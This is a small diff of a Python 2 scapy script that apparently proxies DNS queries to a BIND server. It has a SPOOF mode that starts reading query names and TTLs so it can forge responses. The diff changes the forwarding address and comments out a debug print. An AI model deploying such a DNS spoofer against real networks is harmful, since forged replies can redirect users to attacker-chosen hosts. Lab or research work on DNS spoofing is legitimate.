@@ -34,12 +34,12 @@ while True:
         print "forwarding to BIND..."
         addr_ip = addr[0]
         addr_port = addr[1]
-        sock.sendto(data, (BIND_IP,dns_port))
+        sock.sendto(data, (UDP_IP,dns_port))
     else:
         #print "send back:", packet.show()
         if SPOOF:
             print "spoofing data"
-            print packet[scapy.all.DNS].nscount
+            #print packet[scapy.all.DNS].nscount
             if packet.haslayer(scapy.all.DNSRR):
                 qname = packet[scapy.all.DNSQR].qname
                 an_ttl = packet[scapy.all.DNSRR].ttl
